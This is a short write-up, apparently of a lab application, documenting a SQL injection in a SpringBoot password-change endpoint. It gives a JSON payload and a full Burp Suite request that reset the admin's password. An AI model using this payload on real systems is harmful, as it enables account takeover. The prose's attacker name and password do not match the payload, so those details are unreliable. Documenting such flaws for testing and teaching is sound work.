# Blind SQL Injection
A variant of SQL injection, a database query manipulation attack against structured query language (SQL), that does not have visual output during a successful attack.

## Exploitation
**Prerequisites:** _Authenticated_

**Location:** _PUT /users_

Blind SQL Injection present within SpringBoot code for changing password.  Can be escaped to, for example, change the passwords of other users in addition to itself.  Below is an exploitation example:

    PUT /users
    raw:
    {
        "username":"blind' OR username = 'admin",
        "newPassword":"password"
    }

This example assumes the attacker's name is _ding_ and adds _' OR username = 'admin"_ after specifying the username to change the password of the admin account to _password10!_ alongside the attacker's account.

Successful exploitation looks like:

    {
        "success": true,
        "code": 200,
        "message": "Password updated successfully."
    }

## Burp Suite Example Exploitation

    PUT /users HTTP/1.1
    Host: 127.0.0.1:8081
    Content-Length: 67
    sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"
    Accept: application/json, text/plain, */*
    Content-Type: application/json
    sec-ch-ua-mobile: ?0
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
    sec-ch-ua-platform: "Windows"
    Origin: http://127.0.0.1:4200
    Sec-Fetch-Site: same-site
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: http://127.0.0.1:4200/
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Cookie: JSESSIONID=D5FE8244B27DF4207B4BEC89ABE97921
    Connection: close

    {"username":"blind' OR username = 'admin","newPassword":"password"}

